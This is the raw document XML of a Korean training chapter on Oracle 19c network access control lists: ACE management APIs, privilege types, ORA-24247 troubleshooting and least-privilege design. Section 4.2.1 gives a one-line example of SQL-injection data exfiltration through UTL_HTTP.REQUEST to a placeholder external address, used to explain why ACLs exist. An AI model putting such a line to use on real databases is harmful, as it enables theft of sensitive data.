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네트워크 ACL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1  학습 목표</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>데이터베이스 안의 PL/SQL은 UTL_HTTP, UTL_TCP, UTL_SMTP 같은 패키지로 외부 서버에 접속할 수 있다. 네트워크 ACL은 어떤 사용자가 어느 호스트의 어느 포트에 어떤 방식으로 접속할 수 있는지를 데이터베이스가 직접 판정하게 하는 장치다.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네트워크 유틸리티 패키지에 ACL이 필요한 이유와 ORA-24247이 나는 조건을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ACL과 ACE의 관계, XS$ACE_TYPE의 구성 요소를 설명할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DBMS_NETWORK_ACL_ADMIN.APPEND_HOST_ACE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REMOVE_HOST_ACE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>로 호스트 접근 권한을 주고 회수할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http, smtp, connect, resolve 권한이 각각 허용하는 호출을 구분하고 최소 권한으로 설계할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와일드카드 호스트, 포트 범위, 거부 ACE가 섞였을 때의 판정 순서를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구버전 API(CREATE_ACL, ASSIGN_ACL 등)로 만든 ACL을 19c 뷰에서 확인하고 새 API로 옮길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DBA_HOST_ACES, DBA_HOST_ACLS, USER_HOST_ACES로 권한을 점검하고 ACL 관련 오류의 원인을 찾을 수 있다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2  네트워크 접근 제어의 개념</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.2.1  데이터베이스가 외부로 나가는 경로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데이터베이스는 보통 접속을 받는 쪽이다. PL/SQL 패키지를 쓰면 반대로 데이터베이스가 외부 서버에 접속하는 쪽이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주문이 들어오면 결제 서버에 HTTP로 요청하고, 배치가 끝나면 메일을 보내고, 사내 디렉터리 서버에서 사용자 정보를 읽는 식의 구현이 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경로는 데이터 유출 통로가 되기도 한다. SQL 인젝션에 성공한 공격자가 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>UTL_HTTP.REQUEST('http://외부주소/?d=' || 민감데이터)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>를 실행하면 조회 결과가 외부로 나간다.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내부망의 다른 서버를 탐색하는 발판으로도 쓰인다. DB 서버는 방화벽 안쪽에 있어 외부에서 직접 닿지 않는 서버에도 접속할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그래서 "누가, 어디로, 무엇으로" 나갈 수 있는지를 데이터베이스 안에서 따로 통제한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.2.2  ACL의 통제를 받는 패키지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패키지·타입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필요한 ACL 권한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UTL_HTTP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HTTP·HTTPS 요청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http 또는 connect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HttpUriType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URI로 웹 자원 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http 또는 connect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UTL_SMTP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SMTP 메일 송신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smtp 또는 connect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UTL_MAIL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UTL_SMTP 기반 메일 송신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smtp 또는 connect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UTL_TCP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임의의 TCP 연결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connect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DBMS_LDAP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LDAP 디렉터리 접속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connect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UTL_INADDR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호스트 이름 ↔ IP 변환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resolve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패키지들의 EXECUTE 권한은 설치 직후 PUBLIC에 부여돼 있다. 모든 사용자가 패키지를 호출할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실행 권한만으로는 아무 데도 접속하지 못한다. 접속 시점에 데이터베이스가 ACL을 확인해 허용된 경우에만 연결을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예전에는 PUBLIC의 실행 권한을 회수하는 것이 유일한 방어였다. 그러면 정상 업무 계정까지 막혀 다시 개별 부여해야 했다. ACL은 실행 권한을 그대로 두고 목적지 단위로 제한한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.2.3  기본 거부와 ORA-24247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11g Release 1부터 네트워크 접근은 기본 거부다. ACL에 허용 항목이 없으면 호출은 ORA-24247: network access denied by access control list (ACL)로 끝난다.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UTL_HTTP를 통해 나면 ORA-29273: HTTP request failed 아래에 ORA-24247이 함께 나온다. 겉의 ORA-29273만 보고 대상 서버 문제로 오해하지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대상 서버가 꺼져 있을 때도 ORA-29273이 나지만 그 아래 오류가 ORA-12541: TNS:no listener 같은 연결 오류다. ACL 문제와는 아래 줄로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10g 이전 DB를 업그레이드하면 네트워크 패키지를 쓰던 애플리케이션이 업그레이드 직후부터 ORA-24247로 실패한다. 매뉴얼의 업그레이드 관련 절이 짚는 대표 증상이다.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ACL_U1@orcl&gt; SELECT SUBSTR(UTL_HTTP.REQUEST('http://172.16.225.50:8090/'), 1, 40) AS page FROM dual;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SUBSTR(UTL_HTTP.REQUEST('http://172.16.225.50:8090/'), 1, 40) AS page FROM dual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ORA-29273: HTTP request failed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"SYS.UTL_HTTP", line 1530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ORA-24247: network access denied by access control list (ACL)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.2.4  ACL과 ACE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ACL(Access Control List)은 권한 항목의 목록이다. 목록의 각 항목을 ACE(Access Control Entry)라 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ACE 하나는 "어떤 주체(사용자·역할)에게 어떤 권한을 허용 또는 거부한다"를 담는다.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ACL은 호스트(와 포트 범위)에 연결된다. 한 호스트·포트 범위 조합에는 ACL이 하나만 연결된다.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12c부터 네트워크 ACL은 Real Application Security(RAS)의 ACL 객체로 저장된다. 설정은 모두 SYS 스키마에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19c에서는 ACL을 직접 만들 필요가 없다. 호스트에 ACE를 덧붙이면 그 호스트용 ACL이 없을 때 자동으로 생성되며, 이름은 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>NETWORK_ACL_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 뒤에 고유 문자열이 붙은 형태다.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11g 방식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12c 이후(19c) 방식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설정 단위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ACL 파일을 만들고 권한 추가 후 호스트에 할당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호스트에 ACE를 덧붙임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ACL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사용자가 지정한 XML 이름(/sys/acls/이름.xml)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시스템 생성 이름(NETWORK_ACL_...)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저장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XML DB 리포지토리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RAS ACL 객체(SYS 스키마)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 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DBA_NETWORK_ACLS, DBA_NETWORK_ACL_PRIVILEGES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DBA_HOST_ACLS, DBA_HOST_ACES</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.2.5  호출 한 번에 일어나는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일어나는 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실패 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세션이 UTL_HTTP.REQUEST 등 네트워크 패키지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실행 권한이 없으면 PLS-00201·ORA-06550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URL에서 호스트 문자열과 포트를 꺼냄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URL 형식이 잘못되면 UTL_HTTP 오류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호스트에 대해 가장 구체적인 ACL부터 차례로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세션 사용자와 켜진 역할에 해당하는 ACE로 허용·거부 판정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허용이 없으면 ORA-24247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실제 TCP 연결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대상이 꺼져 있으면 ORA-12541, 방화벽이면 ORA-12535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1단계의 실행 권한과 3~4단계의 ACL은 서로 다른 장치다. 실행 권한을 회수하면 1단계에서, ACL이 없으면 4단계에서 막힌다.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4단계까지 통과한 뒤의 오류는 데이터베이스 보안 설정과 무관하다. 네트워크 담당자와 확인할 문제다.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SQL 인젝션 시도가 외부로 나가지 못했다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웹 애플리케이션의 검색 화면에서 SQL 인젝션 취약점이 발견됐다. 접근 로그를 분석하니 공격자는 UTL_HTTP.REQUEST로 회원 테이블의 내용을 외부 서버에 보내려고 여러 번 시도했다.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DB 감사 기록에는 같은 시각 애플리케이션 계정의 ORA-24247이 연달아 남아 있었다. 이 계정은 결제사 호스트 한 곳, 포트 443에만 http ACE가 있었고 공격자의 서버 주소는 허용 목록에 없었다.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취약점은 애플리케이션에서 고쳤고, 데이터는 외부로 나가지 않았다. 이후 ORA-24247 발생 건수를 보안 모니터링 지표에 넣었다.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3  ACE 관리 API — DBMS_NETWORK_ACL_ADMIN</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.3.1  APPEND_HOST_ACE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DBMS_NETWORK_ACL_ADMIN.APPEND_HOST_ACE(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host       =&gt; '172.16.225.50',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lower_port =&gt; 8090,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upper_port =&gt; 8090,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ace        =&gt; xs$ace_type(privilege_list =&gt; xs$name_list('http'),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principal_name =&gt; 'ACL_U1',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principal_type =&gt; xs_acl.ptype_db));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인자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host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호스트 이름 또는 IP. 와일드카드로 도메인·서브넷 지정 가능. 대소문자 구분 없음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lower_port, upper_port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TCP 포트 범위(1~65535). upper_port를 생략하면 lower_port와 같은 값. 둘 다 생략하면 포트 제한 없음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ace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XS$ACE_TYPE으로 만든 권한 항목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호출 하나가 11g의 CREATE_ACL, ADD_PRIVILEGE, ASSIGN_ACL 세 단계를 대신한다.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주체에 이미 있는 권한을 다시 덧붙이면 중복은 건너뛴다. 실수로 두 번 실행해도 ACE가 두 개 생기지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연결된 ACL이 다른 호스트와 공유돼 있으면 수정 전에 사본을 만든다. 한 호스트를 고친 결과가 다른 호스트에 번지지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호출이 성공하면 바로 효력이 생긴다. COMMIT이 필요하지 않다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.3.2  XS$ACE_TYPE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필드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privilege_list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권한 이름 목록. xs$name_list('http', 'smtp') 형식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대소문자 구분 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principal_name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사용자 또는 역할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큰따옴표로 감싸지 않으면 대소문자 구분 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principal_type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주체 유형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반드시 xs_acl.ptype_db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granted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TRUE면 허용, FALSE면 거부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 TRUE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start_date, end_date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유효 기간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기간 한정 권한에 사용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principal_type의 기본값은 PTYPE_XS로, RAS 애플리케이션 사용자를 뜻한다. 데이터베이스 사용자에게 주려면 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>xs_acl.ptype_db</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>를 반드시 적는다.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granted =&gt; FALSE로 만든 ACE는 GRANT_TYPE이 DENY로 표시된다. 넓은 범위를 허용하고 일부만 막을 때 쓴다(4.6절).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ACL 안에서 ACE는 ACE_ORDER 순서로 쌓인다. APPEND_HOST_ACE는 이름 그대로 목록 끝에 덧붙인다.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start_date와 end_date를 쓰면 외부 업체 연동 기간처럼 정해진 기간에만 권한이 유효하다. 기간이 지나도 ACE는 남으므로 정기 점검에서 정리한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.3.3  REMOVE_HOST_ACE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DBMS_NETWORK_ACL_ADMIN.REMOVE_HOST_ACE(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host             =&gt; '172.16.225.50',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ace              =&gt; xs$ace_type(privilege_list =&gt; xs$name_list('http'),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principal_name =&gt; 'ACL_U2',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principal_type =&gt; xs_acl.ptype_db,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granted        =&gt; FALSE),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remove_empty_acl =&gt; TRUE);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지정한 ACE의 권한을 해당 호스트 ACL에서 뺀다. 호스트, 포트 범위, 권한, 주체, granted 값이 추가할 때와 같아야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맞는 ACE가 없으면 ORA-01927: cannot REVOKE privileges you did not grant가 난다. 메시지가 객체 권한 회수와 같아 처음 보면 엉뚱해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remove_empty_acl =&gt; TRUE를 주면 ACE가 하나도 남지 않은 ACL을 함께 지운다. 기본값 FALSE면 빈 ACL이 호스트에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지울 대상은 DBA_HOST_ACES에서 호스트, 포트, 주체, 권한, GRANT_TYPE을 그대로 읽어 인자로 넘기면 틀리지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유효 기간을 둔 예는 다음과 같다. 연동 시험 기간 2주 동안만 시험 서버에 대한 http를 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DBMS_NETWORK_ACL_ADMIN.APPEND_HOST_ACE(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host       =&gt; 'test-pay.example.com',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lower_port =&gt; 443,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ace        =&gt; xs$ace_type(privilege_list =&gt; xs$name_list('http'),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principal_name =&gt; 'APP_USER',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principal_type =&gt; xs_acl.ptype_db,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start_date     =&gt; SYSTIMESTAMP,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end_date       =&gt; SYSTIMESTAMP + INTERVAL '14' DAY));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여러 호스트를 같은 주체에 한꺼번에 주려면 호스트 목록을 돌며 APPEND_HOST_ACE를 호출한다. 중복 권한은 건너뛰므로 같은 스크립트를 다시 실행해도 안전하다.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FOR h IN (SELECT column_value AS host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FROM TABLE(sys.odcivarchar2list('mail1.example.com', 'mail2.example.com'))) LOOP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DBMS_NETWORK_ACL_ADMIN.APPEND_HOST_ACE(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host       =&gt; h.host,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lower_port =&gt; 25,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ace        =&gt; xs$ace_type(privilege_list =&gt; xs$name_list('smtp'),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principal_name =&gt; 'BATCH_USER',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principal_type =&gt; xs_acl.ptype_db));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LOOP;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4.3.4  구버전 API와의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구버전(12c부터 디프리케이트)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대체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CREATE_ACL, ADD_PRIVILEGE, ASSIGN_ACL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APPEND_HOST_ACE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DELETE_PRIVILEGE, UNASSIGN_ACL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REMOVE_HOST_ACE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ASSIGN_WALLET_ACL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APPEND_WALLET_ACE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UNASSIGN_WALLET_ACL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REMOVE_WALLET_ACE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CHECK_PRIVILEGE, CHECK_PRIVILEGE_ACLID, DROP_ACL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대체 없음(하위 호환용으로만 유지)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 실습 자료와 다른 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과정 원본 자료는 CREATE_ACL로 test_acl_file.xml을 만들고 ADD_PRIVILEGE, ASSIGN_ACL로 사용자와 호스트를 붙이는 11g 방식을 쓴다. 19c에서도 이 호출은 동작하며, 만들어진 ACL은 DBA_HOST_ACLS와 DBA_HOST_ACES에 새 방식의 ACL과 함께 나타난다.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다만 PL/SQL Packages and Types Reference는 이 프로시저들을 12c부터 디프리케이트로 표시하고 APPEND_HOST_ACE와 REMOVE_HOST_ACE를 쓰도록 권장한다. 이 교안의 실습은 새 API로 진행하고, 구버전 API는 실습 04에서 기존 ACL을 읽는 법을 익히는 용도로만 다룬다.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같은 이름으로 CREATE_ACL을 다시 실행하면 ORA-46212: XS entity with this name already exists가 난다. ACL이 RAS 객체로 저장된다는 흔적이다.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.3.5  계정 정리와 ACE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19.3에서 DROP USER로 계정을 지우면 그 계정이 주체인 ACE는 함께 사라진다. 같은 이름으로 계정을 다시 만들어도 예전 권한은 살아나지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그러나 ACE만 사라지고 그 호스트에 할당된 ACL은 빈 채로 남는다. DBA_HOST_ACLS에는 호스트가 계속 보이고 DBA_HOST_ACES에는 아무것도 없는 상태가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빈 ACL은 REMOVE_HOST_ACE로 지울 수 없다. 지울 ACE가 없으므로 ORA-01927이 난다. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>DBMS_NETWORK_ACL_ADMIN.SET_HOST_ACL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>에 acl =&gt; NULL을 주어 호스트 할당을 해제해야 정리된다.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깔끔하게 정리하려면 계정을 지우기 전에 그 계정이 주체인 ACE를 remove_empty_acl =&gt; TRUE로 먼저 지운다.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FOR r IN (SELECT host, lower_port, upper_port, principal, privilege, grant_type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FROM dba_host_aces WHERE principal = 'OLD_APP') LOOP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DBMS_NETWORK_ACL_ADMIN.REMOVE_HOST_ACE(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host             =&gt; r.host,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lower_port       =&gt; r.lower_port,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upper_port       =&gt; r.upper_port,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ace              =&gt; xs$ace_type(privilege_list =&gt; xs$name_list(r.privilege),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  principal_name =&gt; r.principal,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  principal_type =&gt; xs_acl.ptype_db,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       granted        =&gt; (r.grant_type = 'GRANT')),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remove_empty_acl =&gt; TRUE);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END LOOP;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빈 ACL 찾기와 정리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l.host, l.lower_port, l.upper_port, l.acl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dba_host_acls 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NOT EXISTS (SELECT 1 FROM dba_host_aces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WHERE a.host = l.host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AND NVL(a.lower_port, -1) = NVL(l.lower_port, -1));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 DBMS_NETWORK_ACL_ADMIN.SET_HOST_ACL(host =&gt; 'old.example.com', lower_port =&gt; NULL, upper_port =&gt; NULL, acl =&gt; NULL)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 05의 철거 단계가 이 방식이다. 조회 결과를 그대로 인자로 넘기므로 호스트 대소문자, 포트, GRANT·DENY를 틀릴 일이 없다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.4  권한 종류와 최소 권한</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.4.1  호스트 ACE에 쓰는 권한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허용하는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http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UTL_HTTP, HttpUriType으로 해당 호스트에 HTTP 요청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http_proxy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프록시를 거치는 HTTP 요청. 프록시 경유 시 http와 함께 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smtp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UTL_SMTP, UTL_MAIL로 메일 송신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connect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UTL_TCP, UTL_SMTP, UTL_MAIL, UTL_HTTP, DBMS_LDAP, HttpUriType의 네트워크 연결 전반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resolve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UTL_INADDR로 호스트 이름과 IP 변환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jdwp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Java Debug Wire Protocol로 Java·PL/SQL 디버깅 연결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connect는 가장 넓은 권한이다. 모든 네트워크 패키지의 연결을 허용한다.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HTTP 호출만 하는 애플리케이션에 connect를 주면 같은 호스트·포트로 UTL_TCP 원시 연결까지 열린다. 매뉴얼은 http, smtp처럼 용도별 권한을 쓰도록 권장한다.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http 권한만 받은 사용자가 같은 포트로 UTL_TCP 연결을 열면 ORA-24247이다. 실습 02에서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resolve는 이름 풀이만 허용한다. 이름으로 접속하는 코드라도 데이터베이스가 내부적으로 하는 이름 해석에는 resolve가 필요하지 않다. UTL_INADDR를 직접 호출할 때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jdwp는 개발 서버에서 SQL Developer 같은 도구로 PL/SQL을 디버깅할 때 쓴다. 운영 DB에는 주지 않는다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.4.2  주체 선택 — 사용자와 역할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주체에는 사용자와 역할 모두 쓸 수 있다. 같은 목적지를 쓰는 사용자가 여럿이면 역할에 ACE를 주고 역할을 부여하는 편이 관리하기 쉽다.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 ACE는 세션에서 그 역할이 켜져 있을 때만 통한다. SET ROLE NONE으로 역할을 끄면 같은 사용자도 ORA-24247을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정의자 권한(definer's rights) 프로시저 안에서는 역할이 비활성화된다. 프로시저가 UTL_HTTP를 호출한다면 프로시저 소유자에게 직접 ACE를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호출자 권한(invoker's rights) 프로시저는 호출한 사용자의 권한으로 판정된다. 같은 코드라도 누가 부르느냐에 따라 결과가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최소 권한 원칙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목적지는 와일드카드 대신 구체적인 호스트로 지정한다. 업체 서버가 여러 대면 그 서브넷까지만 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포트는 실제로 쓰는 포트 하나로 제한한다. HTTPS라면 443만 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권한은 http, smtp처럼 용도별로 준다. connect는 UTL_TCP가 꼭 필요한 경우에만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주체는 애플리케이션 계정 하나 또는 역할 하나로 모은다. 개인 계정에 직접 주지 않는다.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SQL*Plus에서는 되는데 프로시저로 감싸면 실패한다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개발자가 SQL*Plus에서 UTL_HTTP.REQUEST를 직접 실행해 응답을 확인한 뒤, 같은 호출을 프로시저로 만들어 배포했다. 프로시저를 실행하자 ORA-24247이 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개발 계정은 WEB_CALLER 역할을 통해 http ACE를 받고 있었다. SQL*Plus 세션에서는 역할이 켜져 있어 통과했지만, 정의자 권한 프로시저 안에서는 역할이 비활성화되어 ACE가 적용되지 않았다.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프로시저 소유 계정에 직접 http ACE를 주자 해결됐다. 역할은 대화형 사용자용으로 남기고, 저장 프로시저 소유자에게는 직접 부여하는 것을 팀 규칙으로 정했다.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.4.3  메일 발송 구성 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UTL_MAIL은 기본 설치되지 않는다. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>$ORACLE_HOME/rdbms/admin/utlmail.sql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prvtmail.plb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>를 SYS로 실행해 설치한다.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메일 서버는 초기화 파라미터 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>SMTP_OUT_SERVER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>호스트:포트</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 형식으로 지정한다. 파라미터만 설정하고 ACL을 주지 않으면 UTL_MAIL.SEND가 ORA-24247로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메일 발송에 필요한 권한은 smtp다. 메일 서버 호스트와 포트 25(또는 587)로 제한해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UTL_SMTP로 직접 세션을 여는 코드도 같은 smtp 권한으로 동작한다.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ALTER SYSTEM SET smtp_out_server = 'mail.example.com:25' SCOPE = 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DBMS_NETWORK_ACL_ADMIN.APPEND_HOST_ACE(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host       =&gt; 'mail.example.com',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lower_port =&gt; 25,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ace        =&gt; xs$ace_type(privilege_list =&gt; xs$name_list('smtp'),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principal_name =&gt; 'BATCH_USER',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principal_type =&gt; xs_acl.ptype_db));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4.4.4  프록시를 거치는 HTTP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사내망에서 외부로 나가는 HTTP가 프록시 서버를 거쳐야 하면 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>UTL_HTTP.SET_PROXY</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>로 프록시를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이때 프록시 서버 호스트·포트에 대한 http_proxy 권한과 최종 목적지 호스트에 대한 http 권한이 함께 필요하다. 매뉴얼은 프록시 경유 요청에서 http_proxy를 http와 함께 쓰도록 적고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프록시만 열어 두면 프록시가 허용하는 모든 외부 주소로 나갈 수 있다. 목적지 http 권한으로 실제 대상 호스트를 제한하는 구성이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connect를 주던 습관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11g 시절 자료와 예제는 대부분 connect와 resolve 두 권한만 쓴다. 당시 네트워크 ACL의 권한이 사실상 그 두 가지였기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12c부터 http, http_proxy, smtp 같은 세분화된 권한이 생겼다. 예전 스크립트를 그대로 옮겨 쓰면 필요보다 넓은 connect가 계속 퍼지므로, 새로 등록할 때 용도별 권한으로 바꾼다.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.5  호스트와 포트 지정</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.5.1  호스트 문자열과 와일드카드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host에는 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>www.example.com</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 같은 이름이나 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>172.16.225.50</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 같은 IP를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와일드카드는 왼쪽에만 쓴다. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>*.example.com</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">은 example.com의 모든 하위 호스트, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>172.16.225.*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">은 그 서브넷 전체,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>는 모든 호스트다.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ACL 판정은 호출할 때 적은 호스트 문자열로 한다. IP로 등록하고 이름으로 호출하면 다른 호스트로 취급되어 ORA-24247이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02에서 172.16.225.50에 http를 준 사용자가 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>http://oel7v9:8090/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>을 호출하자 거부됐다. oel7v9가 172.16.225.50으로 풀리는 이름이어도 ACL은 별개로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애플리케이션 코드가 이름을 쓰는지 IP를 쓰는지 먼저 확인하고 그 문자열로 등록한다. 둘 다 쓰면 둘 다 등록한다.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개발 서버에서는 되는데 운영 서버에서만 ORA-24247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결제 연동 모듈이 개발 DB에서는 정상인데 운영 DB에서 ORA-24247로 실패했다. 두 DB 모두 결제 서버 IP로 http ACE가 등록돼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애플리케이션 설정을 확인하니 개발 환경은 IP로, 운영 환경은 결제사가 안내한 도메인 이름으로 URL을 만들고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운영 DB에 도메인 이름으로 ACE를 추가하자 정상화됐다. IP로 등록한 ACE는 쓰이지 않으므로 정리했고, 이후 ACL 등록 요청서에 "URL에 쓰는 호스트 문자열 그대로"를 적도록 양식을 바꿨다.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
